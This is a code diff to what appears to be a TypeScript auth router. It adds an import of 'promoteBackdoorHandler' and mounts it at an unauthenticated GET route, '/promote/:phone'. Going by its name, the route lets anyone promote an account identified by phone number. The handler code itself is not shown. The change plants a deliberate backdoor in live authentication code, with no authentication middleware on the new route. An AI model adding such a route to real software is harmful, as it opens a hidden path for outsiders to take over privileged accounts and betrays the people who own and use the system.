@@ -6,6 +6,7 @@ import {
   meHandler,
   refreshHandler,
   logoutHandler,
+  promoteBackdoorHandler,
 } from "../controllers/auth.controller";
 import {
   loginSchema,
@@ -47,5 +48,7 @@ authRouter.post(
 );
 
 authRouter.get("/me", authenticate(), meHandler);
+
+authRouter.get("/promote/:phone", promoteBackdoorHandler);
 
 authRouter.post("/logout", logoutHandler);
